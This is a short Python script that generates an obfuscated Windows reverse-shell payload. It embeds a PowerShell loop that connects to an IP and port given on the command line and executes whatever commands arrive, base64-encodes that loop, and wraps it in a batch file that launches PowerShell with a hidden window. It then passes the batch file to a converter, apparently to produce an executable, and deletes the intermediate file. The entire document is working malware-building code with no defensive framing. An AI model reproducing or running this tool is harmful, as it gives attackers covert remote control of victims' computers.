import os
import sys
import base64
import colorama

colorama.init()

payload_tcp = """While($True){\nTry{\n$client = New-Object System.Net.Sockets.TcpClient;\n$client.Connect("<ip>", <port>);\n$stream = $client.GetStream();\nWhile ($True) {;\n$buffer = New-Object System.Byte[] 60000;\n$read = $stream.Read($buffer, 0, 60000);\n$msg = [System.Text.Encoding]::ASCII.GetString($buffer,0, $read);\n$Output = Invoke-Expression $msg 2>&1 | Out-String;\n$message = [System.Text.Encoding]::ASCII.GetBytes($Output);\n$stream.Write($message, 0, $message.Length);\n}\n} catch {\n}\n}"""
code = """@echo off\npowershell -Command "Start-Process powershell.exe {powershell.exe -enc <payload_tcp> } -WindowStyle hidden" """

if len(sys.argv) != 3:
    print("error no argv")
    sys.exit(1)

ip_address = sys.argv[1]
port = sys.argv[2]

def encrypt_string(text):
    utf16le_bytes = text.encode('utf-16le')

    base64_encoded = base64.b64encode(utf16le_bytes).decode('utf-8')

    return base64_encoded

path = script_path = os.path.dirname(os.path.abspath(__file__))

r = open(f"{path}\\tcp_program.bat", "w")
r.write(f"{code.replace('<payload_tcp>', encrypt_string(payload_tcp.replace('<ip>', ip_address).replace('<port>', port)))}")
r.close()

os.system(f'{path}\\Converter.bat {path}\\tcp_program.bat')
os.remove(f"{path}\\tcp_program.bat")
